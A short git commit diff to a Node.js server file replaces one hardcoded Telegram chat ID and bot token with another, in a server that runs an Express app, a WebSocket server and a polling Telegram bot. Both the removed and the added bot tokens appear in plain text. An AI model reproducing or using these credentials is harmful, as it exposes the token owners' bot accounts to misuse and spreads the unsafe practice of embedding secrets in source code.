84808112b2fc75096eddb59204e77de2558f4bfe
parhamsyber <freefiregod32756@gmail.com>
2025-05-06 17:52:05 +0330

    Update server.js

--- server.js
+++ server.js
@@ -5,8 +5,8 @@ const app = express()
 app.use(bodyParser.json());
 const server = http.createServer(app);
 const wss = new socket.Server({server});
-const chatId = '5265371934'
-const token = '5171666407:AAFbQ6iLPo2r9DazrMN9sPhtYdWLy_uxGf8'
+const chatId = '7239544191'
+const token = '7996578351:AAG3ZgtjPzUVCS4hpgTCjmf_u4t5voPmcA4'
 const serverAddr = ''
 const bot = new TelegramBot(token, {polling: true});
 
